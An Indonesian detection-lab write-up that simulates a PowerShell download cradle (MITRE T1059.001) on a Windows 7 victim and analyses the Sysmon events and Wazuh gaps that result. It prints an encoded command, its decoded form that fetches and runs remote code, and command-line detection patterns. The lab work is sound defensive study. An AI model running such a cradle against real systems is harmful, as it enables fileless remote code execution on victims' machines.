# Command and Scripting Interpreter: PowerShell (T1059.001) — Win7 Victim

## Tujuan

Simulasi **execution via PowerShell** di Win7 victim (`10.10.20.10`, LAN2) sesuai MITRE ATT&CK **T1059.001**, lalu amati sinyal apa yang bisa ditangkap **Sysmon** yang baru kita pasang di endpoint ini — lihat setup-nya di [`win7-sysmon.md`](../../../../../Infrastructure/win7-sysmon.md).

Skenario yang ditiru: **download cradle** — PowerShell dieksekusi dengan encoded command yang, begitu di-decode, narik konten dari sebuah web server eksternal via `Net.WebClient.DownloadString`. Ini pola khas malware stage-1: proses di host korban ngehubungi C2 buat minta payload/dropper berikutnya. Kali (`192.168.43.111`) berperan sebagai **staging server / C2 tiruan** yang nyediain file, Win7 sebagai korban yang narik file itu keluar.

Ini lab **assume-breach** — kita gak eksploitasi remote apa-apa. Titik berangkatnya adalah asumsi attacker udah punya cara ngetik command di Win7 (disimulasikan dengan ngetik manual di `cmd.exe`). Fokusnya **deteksi**: begitu command jalan, jejak apa yang muncul, dan seberapa jauh SIEM kita bisa lihat.

Sesuai filosofi lab: **deteksi dulu, bukan eksploitasi.**

---

## Prerequisites

- **Sysmon terpasang & jalan di Win7** dengan config yang ngaktifin **NetworkConnect (event 3)** — lihat [`win7-sysmon.md`](../../../../../Infrastructure/win7-sysmon.md). Config custom schema 2.01 yang kita build dipakai di sini; tanpa event 3 aktif, koneksi outbound ke C2 gak bakal kelihatan.
- **Wazuh Agent di Win7 Active** dan baca channel Sysmon — lihat [`win7-wazuh-agent.md`](../../../../../Infrastructure/win7-wazuh-agent.md).
- **Win7 bisa reach Kali** di jaringan hotspot (`192.168.43.x`). Koneksi Win7 (LAN2) → Kali (WAN/hotspot) nyeberang pfSense sebagai outbound.
- **Kali** siap sebagai web server sederhana (Python `http.server` atau sejenis).

---

## Step-by-Step

### 1. Kali — siapkan payload & serve sebagai web server

Buat file payload dummy (bukan malware asli, cuma penanda buat mastiin download jalan):

```bash
echo "Write-Host 'Simulated payload executed - Lab Test'" > test.txt
python3 -m http.server 4000
```

Port `4000` dipilih sengaja non-standard biar gampang dibedain dari traffic lain di lab.

![Kali setup web server](<./assets/kali setup web server.png>)

### 2. Win7 — eksekusi encoded PowerShell via cmd.exe

Dari `cmd.exe` di Win7 (assume-breach: attacker udah bisa ngetik di sini), jalanin:

```cmd
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAMwAuADEAMQAxADoANAAwADAAMAAvAHQAZQBzAHQALgB0AHgAdAAnACkA
```

Tiga flag yang dipakai punya makna deteksi masing-masing:

| Flag | Fungsi | Kenapa mencurigakan |
|------|--------|---------------------|
| `-NoProfile` | Skip profile PowerShell | Attacker gak mau ke-pengaruh config user, ciri khas eksekusi otomatis |
| `-ExecutionPolicy Bypass` | Lewati execution policy | Klasik — matiin pagar yang harusnya nahan script gak dikenal |
| `-EncodedCommand <base64>` | Jalanin command base64 UTF-16LE | Obfuscation — sembunyiin maksud asli dari mata yang cuma lihat command line sekilas |

![Command prompt execution manual](<./assets/command prompt execution manual.png>)
![Command execution](<./assets/command execution.png>)
![PowerShell popup](<./assets/powershell popup.png>)

### 3. Decode encoded command (dari sisi analis)

Base64 di atas adalah UTF-16LE. Di-decode hasilnya:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.43.111:4000/test.txt')
```

Artinya: `DownloadString` narik konten `test.txt` dari Kali **langsung ke memory** (bukan ke disk), lalu `IEX` (`Invoke-Expression`) langsung meng-eksekusi string itu sebagai kode PowerShell. Inilah inti download cradle — payload gak pernah nyentuh disk sebagai file, jadi deteksi berbasis file scanning kemungkinan besar gak kena.

Cara decode manual (di Kali/Linux):

```bash
echo "SQBFAFgAIA...(base64)...KQA=" | base64 -d | iconv -f UTF-16LE -t UTF-8
```

---

## Verifikasi

### A. Event Sysmon yang tertangkap (Event Viewer, Win7)

Satu eksekusi PowerShell ninggalin rangkaian event ini di channel `Microsoft-Windows-Sysmon/Operational`. Semua di-korelasi lewat **ProcessId 4060** (powershell.exe):

| Event ID | Task | Detail kunci | Waktu (UTC) |
|----------|------|--------------|-------------|
| **1** | Process Create | `powershell.exe` (PID 4060), parent `cmd.exe` (PID 4064), command line lengkap termasuk `-EncodedCommand` | 07:55:15.168 |
| **9** | RawAccessRead | `powershell.exe` (PID 4060) akses raw ke volume | 07:55:15.168 |
| **2** | FileCreateTime | `powershell.exe` (PID 4060) ubah creation-time file di `%TEMP%` | 07:55:15.168 |
| **3** (TCP) | Network Connect | `powershell.exe` (PID 4060) `10.10.20.10:49166` → `192.168.43.111:4000` TCP | 07:55:29.990 |
| **3** (UDP) | Network Connect | `System` (PID 4) `10.10.20.10:137` → `192.168.43.111:137` UDP, netbios-ns | 07:55:42.936 |

**Event 1** adalah sinyal paling kaya. Command line utuh kerekam — termasuk blob `-EncodedCommand` — dan relasi parent-child `cmd.exe → powershell.exe` yang jadi pola khas eksekusi manual/scripted.

![Connect Win7 to Kali TCP via port 4000](<./assets/connect win 7 to kali tcp via port 4000.png>)
![UDP protocol Win7 connect to Kali](<./assets/udp protocol win 7 connect to kali download file.png>)

### B. Log ke-forward ke Wazuh Manager (Dell)

Event dari Win7 nyampe Manager, kelihatan di `archives.log`:

```bash
sudo grep "WIN7-VICTIM" /var/ossec/logs/archives/archives.log | grep -i powershell
```

![Archives log Wazuh](<./assets/archives log wazuh.png>)

> **Disclaimer soal evidence ini:** log Sysmon **berhasil** di-forward ke Wazuh Manager — itu poin utamanya, chain collection jalan. Tapi event yang ke-capture di screenshot `archives.log` ini adalah **run yang berbeda** dari command yang didemokan di Step 2. Kelihatan dari `-EncodedCommand`-nya: blob base64 di sini decode ke `http://192.168.43.111/test.txt` (**port 80**, run pukul 07:42, PID 1712), sedangkan Step 2 dan screenshot koneksi TCP/UDP pakai run yang decode ke `http://192.168.43.111:4000/test.txt` (**port 4000**, run pukul 07:55, PID 4060). Tekniknya identik — cuma URL di dalam payload (jadi base64-nya juga) yang beda antar run. Jadi jangan bingung kalau base64 di screenshot ini gak sama persis dengan yang di Step 2.

---

## Analisis — Dua Pertanyaan yang Muncul Saat Testing

### 1. UDP port 137 (netbios-ns) — apakah itu proses download-nya?

**Bukan.** Bukti dari Sysmon event-nya sendiri:

- Event 3 UDP itu `Image: System`, `ProcessId: 4` — **bukan** `powershell.exe`. Kalau ini bagian dari download, harusnya PID-nya 4060.
- Port 137 = **NetBIOS Name Service**. Ini perilaku Windows yang bikin **node status query** buat nyari tahu nama NetBIOS dari IP `192.168.43.111` yang belum dikenal. Kejadiannya sebagai efek samping Win7 nyoba resolve identitas host tujuan.
- Download yang beneran adalah **event 3 TCP** oleh `powershell.exe` ke port **4000** (port web server Kali) — itu yang bawa data HTTP.

Jadi UDP 137 ini **noise incidental** dari name resolution, bukan transfer payload. Intuisi awal ("sepertinya bukan ya") tepat.

### 2. Event 2 (FileCreateTime) — apakah itu file `test.txt` dari IEX?

**Bukan.** Field `TargetFilename` di event-nya sudah memastikan ini:

```
TargetFilename:          C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\4H24X4V7BAVJHUTROEP1.temp
CreationUtcTime:         2026-07-11 15:15:32.352
PreviousCreationUtcTime: 2026-09-15 07:55:15.214
```

Dua alasan kenapa ini **bukan** payload download:

1. **`DownloadString` gak nyentuh disk.** Kontennya ditarik ke memory sebagai string, langsung dieksekusi `IEX`. `test.txt` gak pernah jadi file di Win7 — jadi mustahil dia yang muncul di sini.
2. **Path-nya `Recent\CustomDestinations\*.temp`** — itu file **Jump List** (CustomDestinations), artifact shell Windows yang nyimpen daftar "recent items" per aplikasi. File `.temp` random ini dibuat waktu Windows nulis ulang jump list, dan kebetulan dikreditkan ke `powershell.exe` (PID 4060) karena proses itu yang memicu update recent-items saat di-launch.

Detail yang menarik: `CreationUtcTime` (2026-07-11) **lebih tua** dari `PreviousCreationUtcTime` (2026-09-15) — creation time-nya di-set **mundur**. Sekilas ini persis pola **timestomping** (T1070.006), tapi di sini itu **perilaku sah Windows**: saat nulis jump list, shell sengaja mewarisi timestamp lama ke file temp-nya. Inilah kenapa config Sysmon matang (mis. SwiftOnSecurity) biasanya **meng-exclude** `Recent\CustomDestinations` di FileCreateTime — kalau enggak, tiap launch aplikasi bikin event 2 yang keliatan kayak timestomping padahal noise.

> **Pelajaran deteksi:** event 2 di sini adalah **false-positive-shaped signal**. Rule naif semacam "powershell.exe memicu FileCreateTime = timestomping" bakal nyala tiap kali powershell dijalankan. Ini justru bahan bagus buat ngerti kenapa exclusion di config Sysmon itu penting.

![Event 2 FileCreateTime detail — TargetFilename Jump List](<./assets/5.png>)

---

## Catatan Deteksi (buat diskusi)

### Event ke-forward, tapi gak ada alert di Wazuh Dashboard

Sama persis dengan temuan pas setup Sysmon Win7: log **sampai** ke Manager (`archives.log`), tapi **gak muncul sebagai alert** di Dashboard.

Soal "level-nya padahal 4" — itu perlu diluruskan. Angka **Level: Information (4)** yang kelihatan di Event Viewer adalah **severity level milik Windows Event Log**, bukan level rule Wazuh. Dua hal beda total:

- **Windows event level** `4` = Information (skala Windows: 1 Critical … 4 Information … 5 Verbose).
- **Wazuh rule level** = skala 0–15 milik Wazuh, yang nentuin apakah sesuatu jadi alert.

Rule bawaan Wazuh buat Sysmon base event (mis. `61603` buat event 1) di-set **Wazuh level 0** = match tapi sengaja gak bikin alert. Jadi walaupun event Windows-nya "Information/4", di sisi Wazuh dia berhenti di level 0 dan gak masuk index `wazuh-alerts-*`. Buat lihat raw event-nya, pakai index pattern `wazuh-archives-*`.

### Keterbatasan visibility di Win7 (PowerShell 2.0)

Win7 cuma punya **PowerShell 2.0**, yang **gak punya Script Block Logging (Event 4104)** — fitur itu baru ada di PowerShell 5.0. Padahal 4104 adalah jalur deteksi PowerShell yang paling umum dipakai karena dia nge-log **isi script yang di-decode**, termasuk hasil de-obfuscation dari `-EncodedCommand`.

Konsekuensinya buat lab ini: di Win7 kita **gak bisa** ngandelin 4104. Yang tersedia buat mendeteksi eksekusi ini:

- **Sysmon Event 1** — command line lengkap (blob `-EncodedCommand` mentah, belum ter-decode) + parent-child.
- **Security 4688** — process creation dengan command line, kalau diaktifkan.

Artinya deteksi harus jalan dari **command-line pattern** (`-EncodedCommand`, `-ExecutionPolicy Bypass`, `DownloadString`) dan **network behavior** (event 3 outbound), bukan dari isi script yang ter-decode.

### Open item

Kombinasi sinyal yang tersedia buat custom rule (belum dibuat — buat diskusi lanjutan):

- Event 1 dengan `win.eventdata.commandLine` mengandung `-EncodedCommand` / `-ExecutionPolicy Bypass` / `-NoProfile`.
- Event 3 dengan `win.eventdata.image` = `powershell.exe` dan `win.eventdata.destinationIp` di luar subnet lab (koneksi C2-like) — perlu event 3 aktif di config Sysmon.
- Korelasi keduanya via `ProcessGuid` yang sama = powershell yang di-launch encoded, lalu ngehubungi eksternal.

---

## Kesimpulan

Eksekusi PowerShell download-cradle di Win7 berhasil disimulasikan dan **tertangkap Sysmon** dengan jejak yang lengkap: process creation (event 1) dengan command line utuh, koneksi outbound TCP ke C2 tiruan (event 3), plus event pendukung (2, 9) dan noise name-resolution (UDP 137 dari System). Chain pengiriman ke Wazuh Manager terverifikasi lewat `archives.log`.

Gap-nya jelas dan sudah terdokumentasi: (1) rule bawaan Wazuh level 0 bikin event ini gak jadi alert, dan (2) PowerShell 2.0 di Win7 gak punya Script Block Logging, jadi deteksi harus bersandar ke command-line pattern + network behavior. Kedua hal ini jadi bahan diskusi buat menentukan custom detection rule.
